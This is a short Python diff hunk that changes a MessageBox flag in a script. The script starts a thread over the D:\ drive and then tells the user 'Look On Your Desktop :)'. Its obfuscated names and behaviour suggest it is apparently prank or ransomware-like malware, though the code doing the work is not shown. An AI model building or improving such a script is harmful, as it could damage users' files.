@@ -46,7 +46,7 @@ try:
         T197193 = threading.Thread(target = chart_Viewr, args=("D:\\",))
         T197193.start()
 
-        win32gui.MessageBox(0, "Look On Your Desktop :)", "Look On Your Desktop :)", win32con.MB_WARNING)
+        win32gui.MessageBox(0, "Look On Your Desktop :)", "Look On Your Desktop :)", win32con.MB_ICONWARNING)
         return 1
     yeyfwfgdufweugfusfuygsj____()
 except Exception as e:
